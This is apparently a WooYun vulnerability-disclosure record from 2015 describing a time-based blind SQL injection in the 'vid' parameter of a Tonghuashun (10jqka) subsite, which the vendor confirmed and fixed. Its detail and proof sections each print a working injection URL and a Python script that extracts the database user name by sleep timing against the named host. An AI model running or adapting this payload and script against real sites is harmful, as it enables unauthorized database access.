{"id": 71323, "wybug_id": "wooyun-2015-0155413", "wybug_title": "同花顺某分站SQL注入(附验证脚本)", "wybug_corp": "同花顺", "wybug_author": "Aug0st", "wybug_date": "2015-11-24 09:40", "wybug_open_date": "2015-11-24 14:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-24：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： rt 详细说明：  地址：http://school.10jqka.com.cn/question.php?op=new&vid=11111vid 参数存在注入http://school.10jqka.com.cn/question.php?op=new&vid=11111+and+(select(1)from(select(case+when(+ascii(mid(user()from(1)for(1)))=114+)then(sleep(5))else(0)end))v)延迟5秒\n\n\nimport urllib2import urllibimport timepayloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'name = \"\"''' http://school.10jqka.com.cn/question.php?op=new&vid=11111%20and%20(select(1)from(select(case%20when(%20ascii(mid(user()from(1)for(1)))=114%20)then(sleep(5))else(0)end))v)'''  for i in range(1,15):    for p in payloads:        s1 = \"%s\" %(i)        s2 = \"%s\" %(ord(p))        s = \"http://school.10jqka.com.cn/question.php?op=new&vid=11111+and+(select(1)from(select(case+when(+ascii(mid(user()from(\"+s1+\")for(1)))=\"+s2+\"+)then(sleep(3))else(0)end))v)\"        start_time = time.time()        try:            req = urllib2.Request(s)             req_data=urllib2.urlopen(req,timeout=10)            if time.time() - start_time > 2.0:                name = name+p                print name+'........................'        except urllib2.URLError,e:             breakprint 'user is %s'  % name\n\n\n   漏洞证明：  地址：http://school.10jqka.com.cn/question.php?op=new&vid=11111vid 参数存在注入http://school.10jqka.com.cn/question.php?op=new&vid=11111+and+(select(1)from(select(case+when(+ascii(mid(user()from(1)for(1)))=114+)then(sleep(5))else(0)end))v)延迟5秒\n\n\nimport urllib2import urllibimport timepayloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'name = \"\"''' http://school.10jqka.com.cn/question.php?op=new&vid=11111%20and%20(select(1)from(select(case%20when(%20ascii(mid(user()from(1)for(1)))=114%20)then(sleep(5))else(0)end))v)'''  for i in range(1,15):    for p in payloads:        s1 = \"%s\" %(i)        s2 = \"%s\" %(ord(p))        s = \"http://school.10jqka.com.cn/question.php?op=new&vid=11111+and+(select(1)from(select(case+when(+ascii(mid(user()from(\"+s1+\")for(1)))=\"+s2+\"+)then(sleep(3))else(0)end))v)\"        start_time = time.time()        try:            req = urllib2.Request(s)             req_data=urllib2.urlopen(req,timeout=10)            if time.time() - start_time > 2.0:                name = name+p                print name+'........................'        except urllib2.URLError,e:             breakprint 'user is %s'  % name\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 Aug0st@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-24 14:57 厂商回复： 已确认漏洞，正在处理，谢谢。 最新状态： 2015-11-24：已修复，谢谢  ", "replys": "漏洞评价：\n评论\n     2015-11-24 22:04 |    \t\tk0_pwn \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 专注二进制许多年，突然觉得web才好玩)\t\t \n  洞主请问一下测这个漏洞的时候因为sqlmap跑不出来才自己写的验证脚本吗？    \n     2015-11-25 02:27 |    \t\tAug0st \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:35        | 看你后面~)\t\t \n  @k0_pwn 恩恩 是的    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}